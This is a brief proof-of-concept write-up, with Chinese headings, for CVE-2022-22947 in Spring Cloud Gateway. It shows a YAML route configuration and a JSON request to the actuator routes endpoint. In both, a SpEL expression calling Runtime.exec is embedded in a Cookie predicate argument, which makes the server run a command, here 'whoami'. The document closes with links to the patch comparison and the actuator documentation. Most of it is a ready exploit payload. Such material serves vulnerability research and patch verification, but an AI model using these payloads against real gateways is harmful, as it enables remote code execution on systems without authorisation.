# CVE-2022-22947


## POC

**edit yml config**

在配置文件中新增路由

```yml
spring:
  cloud:
    gateway:
      routes:
      - id: after_route
        uri: https://example.org
        predicates:
        - name: Cookie
          args:
            name: "#{T(java.lang.Runtime).getRuntime().exec('whoami')}"
            regexp: mycookievalue
```

**from actuator api**

根据 actuator api[^1],可以利用 `/gateway/routes/{id_route_to_create}` 接口来刷新路由

```json
{
  "id": "first_route",
  "predicates": [
    {
      "name": "Cookie",
      "args": {
        "_genkey_0": "#{T(java.lang.Runtime).getRuntime().exec('whoami')}",
        "_genkey_1": "mycookievalue"
      }
    }
  ],
  "filters": [],
  "uri": "https://www.uri-destination.org",
  "order": 0
}
```

## Patch

> [Comparing v3.0.6...v3.0.7 · spring-cloud/spring-cloud-gateway](https://github.com/spring-cloud/spring-cloud-gateway/compare/v3.0.6...v3.0.7)


[^1]: [11. Actuator API](https://cloud.spring.io/spring-cloud-gateway/multi/multi__actuator_api.html)